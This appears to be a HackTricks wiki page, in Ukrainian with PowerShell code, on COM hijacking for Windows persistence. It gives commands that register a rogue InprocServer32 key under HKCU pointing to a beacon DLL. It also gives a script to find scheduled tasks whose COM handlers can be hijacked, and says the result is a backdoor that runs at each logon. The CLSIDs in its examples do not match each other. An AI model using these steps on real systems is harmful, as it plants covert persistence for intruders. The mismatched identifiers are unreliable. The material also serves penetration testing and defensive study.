# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM компонентів

Оскільки значення HKCU можуть бути змінені користувачами, **COM Hijacking** може бути використано як **постійний механізм**. Використовуючи `procmon`, легко знайти шукані реєстрації COM, які не існують, які зловмисник може створити для постійності. Фільтри:

- **RegOpenKey** операції.
- де _Результат_ є **NAME NOT FOUND**.
- і _Шлях_ закінчується на **InprocServer32**.

Якщо ви вирішили, який неіснуючий COM наслідувати, виконайте наступні команди. _Будьте обережні, якщо ви вирішите наслідувати COM, який завантажується кожні кілька секунд, оскільки це може бути надмірно._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks використовують Custom Triggers для виклику COM об'єктів, і оскільки вони виконуються через Task Scheduler, легше передбачити, коли вони будуть активовані.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Перевіряючи вихідні дані, ви можете вибрати один, який буде виконуватися **кожного разу, коли користувач входить в систему**, наприклад.

Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** в **HKEY\CLASSES\ROOT\CLSID** та в HKLM і HKCU, ви зазвичай виявите, що значення не існує в HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Тоді ви можете просто створити запис HKCU, і щоразу, коли користувач входить в систему, ваш бекдор буде активовано.

{{#include ../../banners/hacktricks-training.md}}
